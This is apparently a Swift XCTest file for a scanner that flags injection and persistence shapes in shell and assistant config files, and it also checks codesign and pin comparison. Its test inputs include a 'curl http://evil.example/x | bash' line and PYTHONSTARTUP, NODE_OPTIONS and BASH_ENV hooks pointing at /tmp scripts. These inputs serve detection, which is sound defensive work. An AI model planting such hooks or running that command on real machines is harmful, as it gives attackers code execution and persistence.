import XCTest
@testable import hush

/// The config-injection scan must flag the common persistence/injection shapes
/// and leave clean config alone.
final class VerifyScanTests: XCTestCase {
    func testFlagsEnvHooks() {
        let f = AssistantVerify.scanText(name: ".zshrc", "export PATH=/usr/bin\nexport PYTHONSTARTUP=/tmp/e.py\n")
        XCTAssertEqual(f.count, 1)
        XCTAssertTrue(f[0].issue.contains("PYTHONSTARTUP"))
        XCTAssertEqual(f[0].location, ".zshrc:2")
    }

    func testFlagsRemoteScriptPipedToShell() {
        let f = AssistantVerify.scanText(name: "rc", "curl http://evil.example/x | bash\n")
        XCTAssertTrue(f.contains { $0.issue.contains("piped into a shell") })
    }

    func testFlagsNodeOptionsRequire() {
        let f = AssistantVerify.scanText(name: "rc", "export NODE_OPTIONS=\"--require /tmp/hook.js\"\n")
        XCTAssertTrue(f.contains { $0.issue.contains("NODE_OPTIONS") })
    }

    func testFlagsConfigSpawningRawShell() {
        let f = AssistantVerify.scanText(name: "settings.json", "      \"command\": \"bash\",\n")
        XCTAssertTrue(f.contains { $0.issue.contains("raw shell") })
    }

    func testCleanConfigHasNoFindings() {
        let clean = "export PATH=/usr/local/bin:$PATH\nalias ll='ls -la'\n# a comment mentioning PYTHONSTARTUP is fine\n"
        XCTAssertTrue(AssistantVerify.scanText(name: "rc", clean).isEmpty)
    }

    func testScanConfigReadsKnownFiles() throws {
        let home = FileManager.default.temporaryDirectory.appendingPathComponent("hush-vh-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: home, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: home) }
        try "export BASH_ENV=/tmp/x\n".write(to: home.appendingPathComponent(".zshrc"),
                                              atomically: true, encoding: .utf8)
        let f = AssistantVerify.scanConfig(home: home.path, projectDir: "/nonexistent-\(UUID().uuidString)")
        XCTAssertTrue(f.contains { $0.issue.contains("BASH_ENV") })
    }
}

/// Trust-on-first-use pin comparison and the codesign primitive.
final class VerifyPinTests: XCTestCase {
    func testComparePin() {
        XCTAssertEqual(AssistantVerify.comparePin(stored: nil, current: "x"), .pinned)
        XCTAssertEqual(AssistantVerify.comparePin(stored: "x", current: "x"), .matches)
        XCTAssertEqual(AssistantVerify.comparePin(stored: "x", current: "y"), .changed(old: "x"))
    }

    func testCodesignValidatesAnAppleSignedBinary() {
        // /bin/ls is an Apple-signed platform binary: the signature must verify
        // (and it carries no third-party Team ID).
        let sig = AssistantVerify.codesign("/bin/ls")
        XCTAssertTrue(sig.valid, "codesign --verify should pass for /bin/ls")
    }

    func testCodesignRejectsAnUnsignedFile() throws {
        let f = FileManager.default.temporaryDirectory.appendingPathComponent("hush-unsigned-\(UUID().uuidString)")
        try Data("#!/bin/sh\necho hi\n".utf8).write(to: f)
        defer { try? FileManager.default.removeItem(at: f) }
        XCTAssertFalse(AssistantVerify.codesign(f.path).valid, "an unsigned script must not verify")
    }
}
